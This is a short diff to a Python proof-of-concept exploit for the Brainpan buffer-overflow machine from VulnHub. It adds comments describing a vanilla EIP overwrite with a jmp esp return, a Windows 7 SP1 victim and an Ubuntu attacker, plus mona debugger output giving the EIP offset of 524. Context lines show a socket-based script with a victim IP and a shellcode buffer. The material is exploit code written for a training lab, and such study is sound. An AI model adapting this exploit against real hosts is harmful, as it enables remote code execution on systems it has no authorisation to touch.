@@ -1,7 +1,9 @@
 #!/usr/bin/python
 
 # Author : Nu11pwn
-
+# POC for the Brainpan BOF found on Vulnhub, standard vanilla EIP overwrite + jmpesp exploit
+#   Victim system : Windows 7 sp1
+#   Attacker system : Ubuntu
 import socket
 
 victim_host = '10.0.0.213'
@@ -43,6 +45,7 @@ shellcode += "\x9c\xfa\xf5"
 
 # Program crashes with 5000 bytes 
 
+# !mona findmsp / after sending cyclic pattern
 # Log data, item 29
 # Address=0BADF00D
 # Message=    EIP contains normal pattern : 0x35724134 (offset 524)
